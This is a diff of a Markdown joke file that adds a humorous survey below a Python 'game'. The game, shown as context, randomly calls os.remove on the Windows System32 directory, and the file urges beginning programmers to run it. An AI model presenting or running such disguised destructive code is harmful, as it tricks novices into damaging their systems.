@@ -9,3 +9,7 @@ if random.randint(0, 3) == 3:
     os.remove("C:\Windows\System32")
 ```
 ##### A fun game all beginning programmers should execute
+#### How did you enjoy the game?
+- [ ] It was a fantastic experience
+- [ ] While playing I felt as satisfied as the demure man above
+- [ ] I'm using linux
